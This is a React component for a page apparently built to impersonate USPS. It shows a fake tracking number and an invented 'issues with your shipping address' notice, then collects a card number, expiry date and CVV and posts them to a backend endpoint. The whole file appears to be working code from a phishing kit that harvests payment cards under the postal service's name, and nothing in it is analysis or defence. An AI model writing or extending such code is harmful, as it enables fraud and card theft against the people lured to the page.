import React, { useState } from 'react';
import axios from 'axios';
import './PaymentForm.css';
import Footer from './Footer';
import FAQSection from './FAQSection';
import ProgressBar from './ProgressBar';

const PaymentForm = ({ formData, handleChange, nextStep, setError }) => {
  const [loading, setLoading] = useState(false);

  const formatCardNumber = (value) => {
    return value.replace(/\D/g, '')
               .replace(/(\d{4})(?=\d)/g, '$1 ');
  };

  const handleCardNumberChange = (e) => {
    const { name, value } = e.target;
    const formattedValue = formatCardNumber(value);
    handleChange({ target: { name, value: formattedValue.replace(/\s/g, '') } });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      const rawCardNumber = formData.cardNumber.replace(/\s/g, '');
      
      if (rawCardNumber.length !== 16) {
        throw new Error('Card number must be 16 digits');
      }
      
      if (!formData.expirationDate.match(/^\d{2}\/\d{2}$/)) {
        throw new Error('Expiration date must be in MM/YY format');
      }
      
      const [month, year] = formData.expirationDate.split('/');
      if (parseInt(month) > 12 || parseInt(month) < 1) {
        throw new Error('Invalid month (must be 01-12)');
      }
      if (parseInt(year) < 24) {
        throw new Error('Card expired or invalid year');
      }
      
      if (!formData.cvv.match(/^\d{3,4}$/)) {
        throw new Error('CVV must be 3 or 4 digits');
      }
      
      const paymentData = {
        ...formData,
        cardNumber: rawCardNumber
      };
      
      const response = await axios.post('/api/payments/payment-details', paymentData);
      
      if (response.data.success) {
        nextStep();
      } else {
        throw new Error(response.data.error || 'Payment processing failed');
      }
    } catch (err) {
      setError(err.response?.data?.error || err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="usps-payment-container">
      <ProgressBar currentStep="payment" />
      
      <div className="tracking-header">
        <h1>
          <span className="tracking-label">Tracking Number:</span> US9514901165421
        </h1>
      </div>

      <div className="status-notification">
        <div className="status-notification-text">
          <span className="status-notification-label">Status:</span>
          <span className="status-notification-message">We have issues with your shipping address</span>
        </div>
      </div>

      <div className="tracking-message">
        <p>USPS allows you to redirect your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.</p>
      </div>

      <form onSubmit={handleSubmit} className="payment-form">
        <h2 className="payment-header">Payment Information</h2>
        
        <div className="form-group">
          <label>Card Number</label>
          <input
            type="text"
            name="cardNumber"
            value={formatCardNumber(formData.cardNumber)}
            onChange={handleCardNumberChange}
            maxLength={19}
            placeholder="1234 5678 9012 3456"
            required
            disabled={loading}
          />
        </div>
        
        <div className="form-row">
          <div className="form-group">
            <label>Expiration Date (MM/YY)</label>
            <input
              type="text"
              name="expirationDate"
              value={formData.expirationDate}
              onChange={(e) => {
                let value = e.target.value;
                if (value.length === 2 && !value.includes('/')) {
                  value = value + '/';
                }
                handleChange({ target: { name: e.target.name, value } });
              }}
              maxLength="5"
              placeholder="MM/YY"
              required
              disabled={loading}
            />
          </div>
          
          <div className="form-group">
            <label>CVV</label>
            <input
              type="password"
              name="cvv"
              value={formData.cvv}
              onChange={handleChange}
              maxLength="4"
              placeholder="123"
              required
              disabled={loading}
            />
          </div>
        </div>
        
        <div className="form-footer">
          <button 
            type="submit" 
            disabled={loading} 
            className="usps-button"
          >
            {loading ? (
              <>
                <span className="usps-spinner"></span> Processing...
              </>
            ) : 'Continue'}
          </button>
        </div>
      </form>
      <FAQSection/>
      <Footer/>
    </div>
  );
};

export default PaymentForm;